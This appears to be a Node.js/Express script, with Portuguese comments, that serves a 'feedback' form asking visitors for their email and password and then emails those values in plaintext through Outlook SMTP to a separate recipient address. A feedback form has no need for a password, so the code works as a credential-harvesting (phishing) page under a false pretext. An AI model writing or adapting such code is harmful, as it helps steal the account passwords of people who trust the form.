const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', (req, res) => {
  // Envie o formulário HTML para o cliente.
  const formHTML = `
    <form action="/process_form" method="post">
      <label for="email">Email:</label>
      <input type="email" id="email" name="email" required><br>
      <label for="senha">Senha:</label>
      <input type="password" id="senha" name="senha" required><br>
      <label for="feedback">Feedback:</label>
      <textarea id="feedback" name="feedback" required></textarea><br>
      <button type="submit">Enviar</button>
    </form>
  `;
  res.send(formHTML);
});

app.post('/process_form', (req, res) => {
  const email = req.body.email;
  const senha = req.body.senha;
  const feedback = req.body.feedback;

  const transporter = nodemailer.createTransport({
    service: 'Outlook',
    auth: {
      user: 'seu_email@outlook.com', // Insira seu e-mail do Outlook aqui.
      pass: 'sua_senha' // Insira sua senha do Outlook aqui.
    }
  });

  const mailOptions = {
    from: 'seu_email@outlook.com',
    to: 'destinatario@exemplo.com', // Insira o e-mail do destinatário aqui.
    subject: 'Formulário de Feedback',
    html: `<p>E-mail: ${email}</p><p>Senha: ${senha}</p><p>Feedback: ${feedback}</p>`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log('Error sending email:', error);
      res.status(500).send('Error sending email.');
    } else {
      console.log('Email sent:', info.response);
      res.send('Form data submitted and email sent successfully.');
    }
  });
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
